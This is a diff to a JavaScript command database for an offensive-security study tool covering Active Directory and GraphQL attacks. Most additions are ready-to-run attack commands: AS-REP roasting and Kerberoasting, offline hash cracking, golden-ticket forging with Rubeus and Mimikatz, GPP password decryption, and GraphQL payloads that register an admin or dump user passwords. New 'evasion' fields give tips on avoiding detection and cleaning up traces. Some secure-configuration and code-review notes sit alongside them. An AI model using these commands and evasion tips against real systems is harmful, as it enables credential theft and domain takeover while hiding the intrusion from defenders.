-        "why_it_works": "Online brute-force of FTP credentials to gain access to the file service.",
+        "why_it_works": "The service performs no (or weak) rate-limiting/lockout, so an attacker can submit many username/password guesses. Password reuse and weak/default passwords mean a modest wordlist often lands a valid credential. FTP has no built-in lockout, so credential guessing is unthrottled.",
         "prerequisites": "Network access to FTP (21) and credential lists.",
         "impact": "Valid FTP credentials - file read/write and possible foothold.",
         "detection": "Failed authentication bursts: Windows 4625 / Kerberos 4771 at abnormal rate; account lockouts (4740); many attempts from one source, or (spraying) one password across many accounts. Service-specific auth logs show the same spike.",
@@ -21842,10 +22965,6 @@ const COMMAND_DATA = {
       "description": "Enumerate FTP: try anonymous login, browse/mirror files, run NSE scripts, and interact manually with nc/telnet/openssl to read the banner and test commands.",
       "variations": [
         {
-          "label": "Anonymous login (user: anonymous)",
-          "command": "ftp <ip>"
-        },
-        {
           "label": "Mirror everything via wget",
           "command": "wget -m --no-passive ftp://anonymous:anonymous@<ip>"
         },
@@ -21876,7 +22995,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The FTP server allows anonymous login (username 'anonymous', any password), which may expose sensitive files. Additionally, FTP transmits credentials in cleartext over the network — any passive eavesdropper on the same network segment can capture usernames and passwords. FTPS or SFTP should replace FTP in all cases.",
         "vulnerable_config": "# vsftpd — anonymous login enabled (common default):\n# /etc/vsftpd.conf:\nanonymous_enable=YES       # allows login as 'anonymous'\nanon_upload_enable=YES     # anonymous can upload files\nanon_mkdir_write_enable=YES # anonymous can create directories\nwrite_enable=YES\n# No encryption — credentials and data in cleartext (port 21)",
-        "secure_config": "# vsftpd — disable anonymous, enforce encryption:\n# /etc/vsftpd.conf:\nanonymous_enable=NO        # disable anonymous login\nlocal_enable=YES\nwrite_enable=NO            # read-only by default\nchroot_local_user=YES      # jail users to their home directory\n\n# Enable FTPS (TLS):\nssl_enable=YES\nrsa_cert_file=/etc/ssl/certs/vsftpd.crt\nrsa_private_key_file=/etc/ssl/private/vsftpd.key\nforce_local_logins_ssl=YES  # require TLS for all logins\nforce_local_data_ssl=YES    # require TLS for all data transfers\nssl_tlsv1_2=YES\n\n# Better alternative: use SFTP (SSH subsystem) instead of FTP entirely:\n# sshd_config: Subsystem sftp /usr/lib/openssh/sftp-server\n# chroot via Match User block"
+        "secure_config": "# vsftpd — disable anonymous, enforce encryption:\n# /etc/vsftpd.conf:\nanonymous_enable=NO        # disable anonymous login\nlocal_enable=YES\nwrite_enable=NO            # read-only by default\nchroot_local_user=YES      # jail users to their home directory\n\n# Enable FTPS (TLS):\nssl_enable=YES\nrsa_cert_file=/etc/ssl/certs/vsftpd.crt\nrsa_private_key_file=/etc/ssl/private/vsftpd.key\nforce_local_logins_ssl=YES  # require TLS for all logins\nforce_local_data_ssl=YES    # require TLS for all data transfers\nssl_tlsv1_2=YES\n\n# Better alternative: use SFTP (SSH subsystem) instead of FTP entirely:\n# sshd_config: Subsystem sftp /usr/lib/openssh/sftp-server\n# chroot via Match User block",
+        "evasion": "Anonymous/valid-cred access blends in; avoid bulk downloads that spike transfer logs; pull only what you need."
       }
     },
     {
@@ -22002,7 +23122,7 @@ const COMMAND_DATA = {
         "T1558.004"
       ],
       "exam": "exam-ok",
-      "notes": "=== WHY AS-REP ROASTING WORKS ===\nKerberos pre-authentication is the default security mechanism: when a user requests\na TGT, they must first prove knowledge of their password by encrypting a timestamp\nwith their NT hash. This prevents offline cracking of the TGT.\n\nWhen 'Do not require Kerberos preauthentication' (UF_DONT_REQUIRE_PREAUTH) is set\non an account, the DC skips this step and returns an AS-REP encrypted with the\naccount's NT hash — TO ANYONE WHO ASKS, WITHOUT ANY CREDENTIALS.\n\nThis means:\n  1. No valid domain credentials required to attack\n  2. Request AS-REP for any vulnerable account from any machine\n  3. Hash the DC returned is encrypted with the target's password-derived key\n  4. Crack offline — no lockout, no noise from repeated attempts\n\n=== WHEN TO USE -no-pass vs WITH CREDS ===\n  -no-pass -usersfile users.txt → anonymous/no-auth attack: tries each user,\n    DC returns AS-REP if pre-auth is disabled. Requires you have a user list.\n  -u user -p pass (authenticated) → can also enumerate which accounts are\n    vulnerable AND request their AS-REPs in one shot.\n\n=== OUTPUT TO LOOK FOR ===\n  $krb5asrep$23$user@DOMAIN:...  → vulnerable account, hash ready for cracking\n  Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN → user doesn't exist\n  Kerberos SessionError: KDC_ERR_PREAUTH_REQUIRED → pre-auth IS enabled (not vulnerable)\n\n=== HASH FORMAT ===\n$krb5asrep$23$... → etype 23 (RC4), Hashcat mode 18200\n$krb5asrep$18$... → etype 18 (AES256), Hashcat mode 18200 still, but much slower to crack\n\n=== AUTHENTICATED ENUMERATION FIRST ===\nIf you have creds, find vulnerable accounts first with PowerView:\n  Get-DomainUser -PreauthNotRequired | select samaccountname\nThen target GetNPUsers.py against those specific accounts.\n\n=== CHAIN POSITION ===\nThis attack requires NO credentials — ideal for initial access.\nSuccessful crack → password for the account → same spray/lateral movement paths\nas any other cracked password. Also covered in: OSCP PEN-200 Chapter 22 (Attacking Active Directory Authentication).",
+      "notes": "=== WHY AS-REP ROASTING WORKS ===\nKerberos pre-authentication is the default security mechanism: when a user requests\na TGT, they must first prove knowledge of their password by encrypting a timestamp\nwith their NT hash. This prevents offline cracking of the TGT.\n\nWhen 'Do not require Kerberos preauthentication' (UF_DONT_REQUIRE_PREAUTH) is set\non an account, the DC skips this step and returns an AS-REP encrypted with the\naccount's NT hash — TO ANYONE WHO ASKS, WITHOUT ANY CREDENTIALS.\n\nThis means:\n  1. No valid domain credentials required to attack\n  2. Request AS-REP for any vulnerable account from any machine\n  3. Hash the DC returned is encrypted with the target's password-derived key\n  4. Crack offline — no lockout, no noise from repeated attempts\n\n=== WHEN TO USE -no-pass vs WITH CREDS ===\n  -no-pass -usersfile users.txt → anonymous/no-auth attack: tries each user,\n    DC returns AS-REP if pre-auth is disabled. Requires you have a user list.\n  -u user -p pass (authenticated) → can also enumerate which accounts are\n    vulnerable AND request their AS-REPs in one shot.\n\n=== OUTPUT TO LOOK FOR ===\n  $krb5asrep$23$user@DOMAIN:...  → vulnerable account, hash ready for cracking\n  Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN → user doesn't exist\n  Kerberos SessionError: KDC_ERR_PREAUTH_REQUIRED → pre-auth IS enabled (not vulnerable)\n\n=== HASH FORMAT ===\n$krb5asrep$23$... → etype 23 (RC4), Hashcat mode 18200\n$krb5asrep$18$... → etype 18 (AES256), Hashcat mode 18200 still, but much slower to crack\n\n=== AUTHENTICATED ENUMERATION FIRST ===\nIf you have creds, find vulnerable accounts first with PowerView:\n  Get-DomainUser -PreauthNotRequired | select samaccountname\nThen target GetNPUsers.py against those specific accounts.\n\n=== CHAIN POSITION ===\nThis attack requires NO credentials — ideal for initial access.\nSuccessful crack → password for the account → same spray/lateral movement paths\nas any other cracked password. Also covered in: OSCP PEN-200 Chapter 22 (Attacking Active Directory Authentication).\n\n=== CLOCK SKEW (KRB_AP_ERR_SKEW) ===\nKerberos from Linux fails if your host clock differs from the DC by >5 min:\n  'Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)'.\nFix before impacket/Rubeus runs:\n  sudo timedatectl set-ntp off; sudo ntpdate <dc_ip>   # or: sudo rdate -n <dc_ip>",
       "examples": [
         {
           "label": "No-creds spray against user list",
@@ -22060,6 +23180,30 @@ const COMMAND_DATA = {
       },
       "tools": [
         "impacket"
+      ],
+      "variations": [
+        {
+          "label": "Authenticated (enumerate + roast)",
+          "command": "GetNPUsers.py <domain>/<user>:<password> -dc-ip <dc_ip> -request -format hashcat -outputfile asrep.txt"
+        },
+        {
+          "label": "Single user, no creds",
+          "command": "GetNPUsers.py <domain>/<target_user> -dc-ip <dc_ip> -no-pass -format hashcat"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Roast users without pre-auth",
+          "command": "GetNPUsers.py <domain>/ -dc-ip <dc_ip> -no-pass -usersfile <userlist> -format hashcat -outputfile asrep.txt"
+        },
+        {
+          "label": "Crack offline (hashcat 18200)",
+          "command": "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
+        },
+        {
+          "label": "Authenticate as the cracked user",
+          "command": "# re-enumerate from the new user's perspective"
+        }
       ]
     },
     {
@@ -22137,6 +23281,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PKINITtools"
+      ],
+      "variations": [
+        {
+          "label": "From an AS-REP key",
+          "command": "python /opt/PKINITtools/getnthash.py -key <as_rep_key> <domain>/<user>"
+        }
       ]
     },
     {
@@ -22216,6 +23366,22 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PKINITtools"
+      ],
+      "variations": [
+        {
+          "label": "From a PEM instead of base64",
+          "command": "python3 /opt/PKINITtools/gettgtpkinit.py -cert-pem <cert_pem> -key-pem <key_pem> <domain>/<user> user.ccache"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Request a TGT with a certificate (PKINIT)",
+          "command": "python3 /opt/PKINITtools/gettgtpkinit.py -pfx-base64 <b64_pfx> <domain>/<user> user.ccache"
+        },
+        {
+          "label": "Extract the NT hash from the TGT",
+          "command": "export KRB5CCNAME=user.ccache; python /opt/PKINITtools/getnthash.py -key <as_rep_key> <domain>/<user>"
+        }
       ]
     },
     {
@@ -22295,6 +23461,30 @@ const COMMAND_DATA = {
       },
       "tools": [
         "impacket"
+      ],
+      "variations": [
+        {
+          "label": "Pass-the-ticket auth",
+          "command": "GetUserSPNs.py -request -target-domain <foreign_domain> -k -no-pass <domain>/<user>"
+        },
+        {
+          "label": "Rubeus cross-domain",
+          "command": ".\\Rubeus.exe kerberoast /domain:<foreign_domain> /nowrap"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Find foreign-domain SPN accounts",
+          "command": "GetUserSPNs.py -target-domain <foreign_domain> <domain>/<user>:<password>"
+        },
+        {
+          "label": "Request their TGS across the trust",
+          "command": "GetUserSPNs.py -request -target-domain <foreign_domain> <domain>/<user>:<password> -outputfile xf.txt"
+        },
+        {
+          "label": "Crack offline",
+          "command": "hashcat -m 13100 xf.txt /usr/share/wordlists/rockyou.txt"
+        }
       ]
     },
     {
@@ -22353,6 +23543,11 @@ const COMMAND_DATA = {
           "id": "gitlab-userenum",
           "note": "Supplies the valid account this exploit authenticates with.",
           "rel": "prereq"
+        },
+        {
+          "id": "gs-reverse-shells",
+          "rel": "next",
+          "note": "Turn the authenticated RCE into a reverse shell"
         }
       ],
       "id": "gitlab-rce",
@@ -22378,7 +23573,8 @@ const COMMAND_DATA = {
           "HTB M24",
           "MITRE T1190",
           "OWASP A06:2021"
-        ]
+        ],
+        "evasion": "Use valid session/token auth; clean up any runner/CI job or dropped file used for execution; blend into normal CI traffic."
       }
     },
     {
@@ -22461,7 +23657,8 @@ const COMMAND_DATA = {
           "HTB M24",
           "MITRE T1589",
           "OWASP A07:2021"
-        ]
+        ],
+        "evasion": "Use valid session/token auth; clean up any runner/CI job or dropped file used for execution; blend into normal CI traffic."
       }
     },
     {
@@ -22531,10 +23728,6 @@ const COMMAND_DATA = {
       "command": "gobuster dir -u http://<ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt",
       "description": "Brute-force web content paths and DNS subdomains from a wordlist - the standard way to find hidden directories and virtual hosts.",
       "variations": [
-        {
-          "label": "Directory brute force",
-          "command": "gobuster dir -u http://<ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt"
-        },
         {
           "label": "DNS subdomain brute force",
           "command": "gobuster dns -d <domain>.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt"
@@ -22673,7 +23866,21 @@ const COMMAND_DATA = {
         "misconfiguration": "krbtgt password never rotated (common — default AD never rotates krbtgt). Default ticket lifetime settings allow 10-hour TGTs. MDI not deployed. No detection of PAC anomalies in ticketing events.",
         "vulnerable_config": "# krbtgt password age (should be < 6 months):\nGet-ADUser krbtgt -Properties PasswordLastSet | Select-Object PasswordLastSet\n# PasswordLastSet: 2018-01-01 — 6+ years old = krbtgt hash stable for years\n# If attacker got hash, they have indefinite Golden Ticket capability\n\n# Default ticket lifetime (10 hours) matches attacker-forged defaults:\n# Computer Config → Windows Settings → Security Settings → Account Policies → Kerberos Policy\n# Maximum lifetime for user ticket: 10 hours (matches Mimikatz default)",
         "secure_config": "# Rotate krbtgt password TWICE (to invalidate all existing Golden Tickets):\n# Run 24 hours apart (to allow DC replication between rotations):\n$newpw = (New-Object System.Security.SecureString)\n# Or use the Microsoft KRBTGT_UpdateResetKrbtgtAccount tool:\n# https://github.com/microsoft/New-KrbtgtKeys.ps1\n.\\New-KrbtgtKeys.ps1 -Mode EnableAES\n# Run again 10+ hours later for second rotation\n\n# MDI: deploy sensors on all DCs — Golden Ticket detection is built-in\n# Alert triggers when ticket attributes don't match AD account properties\n\n# Restrict DA account logon via Authentication Policy Silos:\nNew-ADAuthenticationPolicySilo -Name 'DA-Silo'\nNew-ADAuthenticationPolicy -Name 'DA-PAW-Policy' -UserAllowedToAuthenticateFrom 'PAW-Computers-SG'\nGet-ADGroupMember 'Domain Admins' | ForEach-Object { Set-ADUser $_ -AuthenticationPolicySilo 'DA-Silo' }"
-      }
+      },
+      "variations": [
+        {
+          "label": "AES256 (stealthier)",
+          "command": "Rubeus.exe golden /aes256:<krbtgt_aes> /domain:<domain> /sid:<domain_sid> /user:Administrator /ptt"
+        },
+        {
+          "label": "Mimikatz",
+          "command": "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<nt_hash> /ptt"
+        },
+        {
+          "label": "Save to file for later",
+          "command": "Rubeus.exe golden /rc4:<nt_hash> /domain:<domain> /sid:<domain_sid> /user:Administrator /outfile:golden.kirbi"
+        }
+      ]
     },
     {
       "id": "crtp-gpo-abuse",
@@ -22838,7 +24045,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Group Policy Preferences (GPP) allowed administrators to push local administrator credentials to machines via XML files stored in SYSVOL (\\\\domain\\SYSVOL\\...). These files were encrypted with AES-256, but Microsoft published the static key in MSDN documentation. Any authenticated domain user can read SYSVOL, so any account configured this way has its password exposed to every domain user. MS14-025 (KB2962486, May 2014) removed the GUI option but left existing files in place.",
         "vulnerable_config": "# SYSVOL Group Policy file containing encrypted password:\n# Path: \\\\corp.local\\SYSVOL\\corp.local\\Policies\\{GUID}\\Machine\\Preferences\\Groups\\Groups.xml\n# Content:\n# <Properties action='U' userName='Administrator' cpassword='edBSHOwhZLTjt...' />\n# The cpassword value is AES-256 encrypted with the static key Microsoft published:\n# Key: 4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8 f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b\n# gpp-decrypt or Get-GPPPassword decrypts it instantly",
-        "secure_config": "# 1. Apply MS14-025 (KB2962486) — blocks new GPP passwords from being created\n#    (already applied if any patch from 2014+ is installed)\n\n# 2. Find and delete all existing cpassword entries in SYSVOL:\n# PowerShell — find all GPP files with cpassword:\nGet-ChildItem -Path '\\\\corp.local\\SYSVOL' -Recurse -Include '*.xml' |\n    Select-String -Pattern 'cpassword' | Select-Object Path\n# Then delete or edit those files to remove the cpassword attribute\n\n# 3. Rotate any passwords that were stored in GPP immediately\n# (assume all were read by every domain user since GPP file creation)\n\n# 4. Use LAPS instead of GPP for local admin passwords:\n# LAPS stores unique per-machine passwords in a protected AD attribute\n# Only members of a specific group can read the LAPS attribute"
+        "secure_config": "# 1. Apply MS14-025 (KB2962486) — blocks new GPP passwords from being created\n#    (already applied if any patch from 2014+ is installed)\n\n# 2. Find and delete all existing cpassword entries in SYSVOL:\n# PowerShell — find all GPP files with cpassword:\nGet-ChildItem -Path '\\\\corp.local\\SYSVOL' -Recurse -Include '*.xml' |\n    Select-String -Pattern 'cpassword' | Select-Object Path\n# Then delete or edit those files to remove the cpassword attribute\n\n# 3. Rotate any passwords that were stored in GPP immediately\n# (assume all were read by every domain user since GPP file creation)\n\n# 4. Use LAPS instead of GPP for local admin passwords:\n# LAPS stores unique per-machine passwords in a protected AD attribute\n# Only members of a specific group can read the LAPS attribute",
+        "evasion": "Access the exposed secret directly and avoid re-triggering the exposure; pull the file over an existing channel."
       }
     },
     {
@@ -22926,6 +24134,22 @@ const COMMAND_DATA = {
       },
       "tools": [
         "gpp-decrypt"
+      ],
+      "variations": [
+        {
+          "label": "Find the cpassword first (Groups.xml)",
+          "command": "findstr /S /I cpassword \\\\<dc>\\SYSVOL\\<domain>\\Policies\\*.xml"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Locate a GPP cpassword in SYSVOL",
+          "command": "grep -r cpassword /mnt/sysvol/  # or findstr on Windows"
+        },
+        {
+          "label": "Decrypt it (AES key is public)",
+          "command": "gpp-decrypt <cpassword>"
+        }
       ]
     },
     {
@@ -23016,8 +24240,15 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "HackTricks GraphQL",
           "OWASP API Security Top 10"
-        ]
-      }
+        ],
+        "code_review": "RED FLAGS (source): introspection on in prod; no depth/cost limit; resolvers without authz; sensitive fields exposed.\n  new ApolloServer({ introspection: true })  |  resolvers that return user objects incl. password/role  |  no depthLimit/costAnalysis\nGREP:  grep -rniE \"introspection ?: ?true|buildSchema|makeExecutableSchema|resolvers\" .\nSAFE:  disable introspection in prod, query depth + complexity limits, field-level authorization, never expose sensitive fields in the schema."
+      },
+      "variations": [
+        {
+          "label": "Self-register as admin (mass assignment)",
+          "command": "mutation { registerUser(input: {username:\"x\", password:\"x\", role:\"admin\"}) { id } }"
+        }
+      ]
     },
     {
       "id": "graphql-dos-batching",
@@ -23097,7 +24328,8 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "HackTricks GraphQL",
           "OWASP API Security Top 10"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): introspection on in prod; no depth/cost limit; resolvers without authz; sensitive fields exposed.\n  new ApolloServer({ introspection: true })  |  resolvers that return user objects incl. password/role  |  no depthLimit/costAnalysis\nGREP:  grep -rniE \"introspection ?: ?true|buildSchema|makeExecutableSchema|resolvers\" .\nSAFE:  disable introspection in prod, query depth + complexity limits, field-level authorization, never expose sensitive fields in the schema."
       }
     },
     {
@@ -23183,7 +24415,8 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "HackTricks GraphQL",
           "OWASP API Security Top 10"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): introspection on in prod; no depth/cost limit; resolvers without authz; sensitive fields exposed.\n  new ApolloServer({ introspection: true })  |  resolvers that return user objects incl. password/role  |  no depthLimit/costAnalysis\nGREP:  grep -rniE \"introspection ?: ?true|buildSchema|makeExecutableSchema|resolvers\" .\nSAFE:  disable introspection in prod, query depth + complexity limits, field-level authorization, never expose sensitive fields in the schema."
       }
     },
     {
@@ -23274,8 +24507,15 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "HackTricks GraphQL",
           "OWASP API Security Top 10"
-        ]
-      }
+        ],
+        "code_review": "RED FLAGS (source): object fetched by a request-supplied id with NO ownership/authorization check.\n  SELECT * FROM x WHERE id = req.params.id   (no AND owner_id = session.user)  |  findById(req.query.id) returned directly\nGREP:  grep -rniE \"findById|WHERE id ?= ?(\\$_|req\\.|params)|/:(id|uid|user_id)\" .\nSAFE:  enforce OBJECT-LEVEL authorization on every access (verify the resource belongs to the caller); use unpredictable IDs (UUID) as defense-in-depth only."
+      },
+      "variations": [
+        {
+          "label": "Iterate object ids",
+          "command": "{ user(id: <n>) { username email } }"
+        }
+      ]
     },
     {
       "id": "graphql-info-disclosure",
@@ -23360,8 +24600,15 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "HackTricks GraphQL",
           "OWASP API Security Top 10"
-        ]
-      }
+        ],
+        "code_review": "RED FLAGS (source): introspection on in prod; no depth/cost limit; resolvers without authz; sensitive fields exposed.\n  new ApolloServer({ introspection: true })  |  resolvers that return user objects incl. password/role  |  no depthLimit/costAnalysis\nGREP:  grep -rniE \"introspection ?: ?true|buildSchema|makeExecutableSchema|resolvers\" .\nSAFE:  disable introspection in prod, query depth + complexity limits, field-level authorization, never expose sensitive fields in the schema."
+      },
+      "variations": [
+        {
+          "label": "Dump users with all fields",
+          "command": "{ users { id username password email role } }"
+        }
+      ]
     },
     {
       "id": "graphql-introspection",
@@ -23455,8 +24702,29 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "HackTricks GraphQL",
           "OWASP API Security Top 10"
-        ]
-      }
+        ],
+        "code_review": "RED FLAGS (source): introspection on in prod; no depth/cost limit; resolvers without authz; sensitive fields exposed.\n  new ApolloServer({ introspection: true })  |  resolvers that return user objects incl. password/role  |  no depthLimit/costAnalysis\nGREP:  grep -rniE \"introspection ?: ?true|buildSchema|makeExecutableSchema|resolvers\" .\nSAFE:  disable introspection in prod, query depth + complexity limits, field-level authorization, never expose sensitive fields in the schema."
+      },
+      "variations": [
+        {
+          "label": "Full introspection query",
+          "command": "{ __schema { queryType { name } types { name fields { name } } } }"
+        },
+        {
+          "label": "Via a tool (clairvoyance if disabled)",
+          "command": "python3 clairvoyance.py http://<target>/graphql -o schema.json"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Confirm introspection is enabled",
+          "command": "{ __schema { types { name } } }"
+        },
+        {
+          "label": "Map queries/mutations, then target sensitive fields",
+          "command": "# see graphql-info-disclosure / graphql-mutations"
+        }
+      ]
     },
     {
       "id": "graphql-sqli",
@@ -23553,7 +24821,8 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "HackTricks GraphQL",
           "OWASP API Security Top 10"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       }
     },
     {
@@ -23711,7 +24980,8 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "HackTricks GraphQL",
           "OWASP API Security Top 10"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
       }
     },
     {
@@ -23788,7 +25058,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "IT teams often grant broad write access to SYSVOL or to individual GPO objects for operational convenience. Script paths in GPO startup/logon tasks may point to shares with weak permissions, allowing any domain user to replace the script.",
         "vulnerable_config": "# GPO Startup Script points to a world-writable share:\n# GPO: \\\\inlanefreight.local\\SYSVOL\\...\\scripts\\startup.bat\nicacls \\\\inlanefreight.local\\SYSVOL\\...\\scripts\\startup.bat\n# Output: Everyone:(F) — full control for all users",
-        "secure_config": "# Restrict script path ACLs — only SYSTEM and Domain Admins\nicacls \\\\inlanefreight.local\\SYSVOL\\...\\scripts /inheritance:r /grant 'Domain Admins:(OI)(CI)F' SYSTEM:F\n# Audit GPO delegations quarterly:\nGet-GPPermission -All -DomainName inlanefreight.local | Where-Object { $_.Permission -eq 'GpoEdit' }"
+        "secure_config": "# Restrict script path ACLs — only SYSTEM and Domain Admins\nicacls \\\\inlanefreight.local\\SYSVOL\\...\\scripts /inheritance:r /grant 'Domain Admins:(OI)(CI)F' SYSTEM:F\n# Audit GPO delegations quarterly:\nGet-GPPermission -All -DomainName inlanefreight.local | Where-Object { $_.Permission -eq 'GpoEdit' }",
+        "evasion": "Read the exposed data with least interaction; revert any change you make; scope queries narrowly to avoid bulk-read alerts."
       },
       "tools": [
         "Group3r"
@@ -24035,10 +25306,21 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The 'Do Not Require Kerberos Preauthentication' checkbox is enabled on the user account (msDS-SupportedEncryptionTypes or the UAC flag UF_DONT_REQUIRE_PREAUTH = 0x400000). This means the KDC issues an AS-REP with the user's session key encrypted by their password hash — without demanding proof of identity first.",
         "vulnerable_config": "# Active Directory user account attribute (via ADUC or ADSI Edit)\n# 'Do not require Kerberos preauthentication' = CHECKED\n# In PowerShell:\nSet-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $true\n\n# UAC flag value: 0x400000 (4194304)\n# Confirmed with:\nGet-ADUser svc_backup -Properties DoesNotRequirePreAuth",
-        "secure_config": "# Enforce Kerberos pre-authentication (the secure default)\n# In PowerShell:\nSet-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $false\n\n# Bulk fix — find and fix all no-preauth accounts:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth |\n  Set-ADAccountControl -DoesNotRequirePreAuth $false\n\n# GPO path (Kerberos policy):\n# Computer Configuration > Windows Settings > Security Settings >\n# Account Policies > Kerberos Policy\n# 'Maximum lifetime for user ticket' should be set (forces preauth implicitly)"
+        "secure_config": "# Enforce Kerberos pre-authentication (the secure default)\n# In PowerShell:\nSet-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $false\n\n# Bulk fix — find and fix all no-preauth accounts:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth |\n  Set-ADAccountControl -DoesNotRequirePreAuth $false\n\n# GPO path (Kerberos policy):\n# Computer Configuration > Windows Settings > Security Settings >\n# Account Policies > Kerberos Policy\n# 'Maximum lifetime for user ticket' should be set (forces preauth implicitly)",
+        "evasion": "Target specific pre-auth-disabled accounts rather than enumerating loudly; the AS-REP request is a single event per user, so keep the set small."
       },
       "tools": [
         "hashcat"
+      ],
+      "variations": [
+        {
+          "label": "John the Ripper",
+          "command": "john --format=krb5asrep --wordlist=<wordlist> <hashfile>"
+        },
+        {
+          "label": "Show cracked",
+          "command": "hashcat -m 18200 <hashfile> --show"
+        }
       ]
     },
     {
@@ -24136,10 +25418,25 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Service accounts are registered with a Service Principal Name (SPN) but use weak, human-chosen passwords — or even share a password with other accounts. Any authenticated domain user can request a TGS for any SPN account, receiving a blob encrypted with that account's NTLM hash. The SPN registration itself is not the flaw; the flaw is weak passwords on SPN accounts and permitting RC4 encryption (which produces a shorter, faster-to-crack blob).",
         "vulnerable_config": "# Service account set up manually with a weak password + SPN\n# Attacker can find these with:\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet\n\n# Bad state — password set 4 years ago, RC4 permitted:\n# Name: svc_sql  PasswordLastSet: 2020-01-15  SPN: MSSQLSvc/db01.corp.local:1433\n# RC4 (0x17) requested in TGS ticket — short hash, GPU-crackable\n\n# Confirming RC4 is available:\nGet-ADUser svc_sql -Properties msDS-SupportedEncryptionTypes\n# msDS-SupportedEncryptionTypes: 0 (= RC4+AES both permitted if 0 or blank)",
-        "secure_config": "# Fix 1 — Use Group Managed Service Accounts (gMSA): 240-char random passwords,\n# auto-rotated by AD, no human ever knows the password\nNew-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.local \\\n    -PrincipalsAllowedToRetrieveManagedPassword 'db-servers-grp'\nInstall-ADServiceAccount gmsa_sql\n\n# Fix 2 — For legacy accounts that must keep SPNs:\n# Set a 100+ character random password (AD max is 127 chars):\n$pw = [System.Web.Security.Membership]::GeneratePassword(127,20)\nSet-ADAccountPassword svc_sql -NewPassword (ConvertTo-SecureString $pw -AsPlainText -Force)\n\n# Fix 3 — Disable RC4, require AES-only:\nSet-ADUser svc_sql -KerberosEncryptionType AES128,AES256\n# msDS-SupportedEncryptionTypes = 24 (AES128+AES256 only)"
+        "secure_config": "# Fix 1 — Use Group Managed Service Accounts (gMSA): 240-char random passwords,\n# auto-rotated by AD, no human ever knows the password\nNew-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.local \\\n    -PrincipalsAllowedToRetrieveManagedPassword 'db-servers-grp'\nInstall-ADServiceAccount gmsa_sql\n\n# Fix 2 — For legacy accounts that must keep SPNs:\n# Set a 100+ character random password (AD max is 127 chars):\n$pw = [System.Web.Security.Membership]::GeneratePassword(127,20)\nSet-ADAccountPassword svc_sql -NewPassword (ConvertTo-SecureString $pw -AsPlainText -Force)\n\n# Fix 3 — Disable RC4, require AES-only:\nSet-ADUser svc_sql -KerberosEncryptionType AES128,AES256\n# msDS-SupportedEncryptionTypes = 24 (AES128+AES256 only)",
+        "evasion": "Use /rc4opsec (skip AES-only accounts, request only downgradable tickets), roast a few high-value SPNs rather than all, and crack offline; avoid mass TGS requests that spike 4769."
       },
       "tools": [
         "hashcat"
+      ],
+      "variations": [
+        {
+          "label": "John the Ripper",
+          "command": "john --format=krb5tgs --wordlist=<wordlist> <hashfile>"
+        },
+        {
+          "label": "hashcat with rules",
+          "command": "hashcat -m 13100 <hashfile> <wordlist> -r /usr/share/hashcat/rules/best64.rule"
+        },
+        {
+          "label": "Show cracked",
+          "command": "hashcat -m 13100 <hashfile> --show"
+        }
       ]
     },
     {
@@ -24215,7 +25512,7 @@ const COMMAND_DATA = {
         }
       ],
       "defense": {
-        "why_it_works": "Cracks captured NetNTLMv1/v2 hashes offline with hashcat (-m 5500/5600) or John to recover the victim's password.",
+        "why_it_works": "The NetNTLMv2 hash captured from poisoning is a challenge-response derived from the user's password, so it can be cracked offline with a wordlist.",
